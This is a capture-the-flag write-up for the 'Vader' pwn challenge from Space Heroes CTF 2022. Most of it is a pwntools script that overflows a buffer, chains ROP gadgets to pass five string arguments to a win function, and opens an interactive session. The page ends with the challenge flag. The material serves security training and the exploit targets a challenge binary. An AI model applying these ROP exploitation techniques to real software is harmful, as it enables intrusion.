---
name: Vader (2022)
event: Space Heroes CTF 2022
category: Pwn
description: Writeup for Vader (Pwn) - Space Heroes CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Vader

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/DRgpQvraTUo/0.jpg)](https://youtu.be/DRgpQvraTUo "Space Heroes CTF 2022: Vader")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x401498
continue
'''.format(**locals())

# Binary filename
exe = './vader'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# ROP gadgets to prepare our 5 params, ready for ret2win
# Calling convention = RDI, RSI, RDX, RCX, R8
pop_rdi = 0x40165b  # 1st param ('DARK')
pop_rsi_r15 = 0x401659  # 2nd param ('S1D3')
pop_rdx = 0x4011ce  # 3rd param ('OF')
pop_rcx_r8 = 0x4011d8  # 4th + 5th params ('TH3'), ('FORC3')

# vader('DARK', 'S1D3', 'OF', 'TH3', 'FORC3')
payload = flat({
    offset: [
        pop_rdi,
        0x402104,  # DARK
        pop_rsi_r15,
        0x4021b4,  # S1D3
        0x0,
        pop_rdx,
        0x402266,  # OF
        pop_rcx_r8,
        0x402315,  # TH3
        0x4023c3,  # FORC3
        elf.functions.vader
    ]
})

# Write payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `shctf{th3r3-1s-n0-try}`
